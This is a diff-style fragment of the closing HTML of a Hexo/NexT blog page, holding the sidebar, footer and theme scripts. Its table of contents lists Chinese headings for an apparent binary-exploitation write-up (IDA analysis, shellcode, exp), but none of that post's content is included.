+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看文件基本信息"><span class="nav-number">1.</span> <span class="nav-text">查看文件基本信息</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#分析程序基本行为"><span class="nav-number"></span> <span class="nav-text">分析程序基本行为</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA分析程序逻辑"><span class="nav-number"></span> <span class="nav-text">IDA分析程序逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number"></span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode的编写"><span class="nav-number">1.</span> <span class="nav-text">shellcode的编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
